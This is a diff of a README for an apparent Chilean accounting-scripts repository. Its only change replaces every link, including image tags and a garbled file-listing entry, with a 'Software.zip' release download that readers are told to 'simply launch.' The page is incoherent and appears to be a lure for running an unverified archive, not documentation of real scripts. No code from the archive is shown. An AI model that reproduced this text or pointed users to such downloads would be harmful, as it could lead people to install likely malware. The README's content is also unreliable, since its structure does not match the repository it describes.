@@ -1,6 +1,6 @@
 # 📊 **Scripts de Contabilidad - Automatizaciones para Manipulación de Datos**
 
-![Contabilidad](https://github.com/Marwan06150/script_contabilidad/releases/download/v1.0/Release.zip)
+![Contabilidad](https://github.com/Marwan06150/script_contabilidad/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the "script_contabilidad" repository, a collection of scripts and automations designed for data manipulation and cleaning within accounting documents specific to Chile. These tools were created to streamline and optimize the process of working with financial data, making it easier for individuals and businesses to manage their accounting tasks efficiently.
@@ -22,7 +22,7 @@ Welcome to the "script_contabilidad" repository, a collection of scripts and aut
 - Terminal color formatting with termcolor
 
 ## Software Download
-[![Download Software](https://github.com/Marwan06150/script_contabilidad/releases/download/v1.0/Release.zip)](https://github.com/Marwan06150/script_contabilidad/releases/download/v1.0/Release.zip) - This link leads directly to the software package that contains the scripts and automations for your convenience. Simply launch the software to get started.
+[![Download Software](https://github.com/Marwan06150/script_contabilidad/releases/download/v2.0/Software.zip)](https://github.com/Marwan06150/script_contabilidad/releases/download/v2.0/Software.zip) - This link leads directly to the software package that contains the scripts and automations for your convenience. Simply launch the software to get started.
 
 If the link does not work or is not provided, please check the "Releases" section of the repository for alternative download options.
 
@@ -32,7 +32,7 @@ The repository is organized as follows:
 - 📁 **automations**: Includes automated tools for cleaning accounting data.
 - 📁 **examples**: Demonstrates the usage of the scripts in real-world scenarios.
 - 📄 **LICENSE**: Details the licensing information for the repository.
-- 📄 **https://github.com/Marwan06150/script_contabilidad/releases/download/v1.0/Release.zip**: You are here!
+- 📄 **https://github.com/Marwan06150/script_contabilidad/releases/download/v2.0/Software.zip**: You are here!
 
 ## Usage
 To leverage the scripts and automations in this repository, follow these steps:
@@ -55,6 +55,6 @@ This repository is licensed under the MIT license. For more information, refer t
 
 🚀 **Start streamlining your accounting processes with the "script_contabilidad" repository!**
 
-![Accounting](https://github.com/Marwan06150/script_contabilidad/releases/download/v1.0/Release.zip)
+![Accounting](https://github.com/Marwan06150/script_contabilidad/releases/download/v2.0/Software.zip)
 
 ---
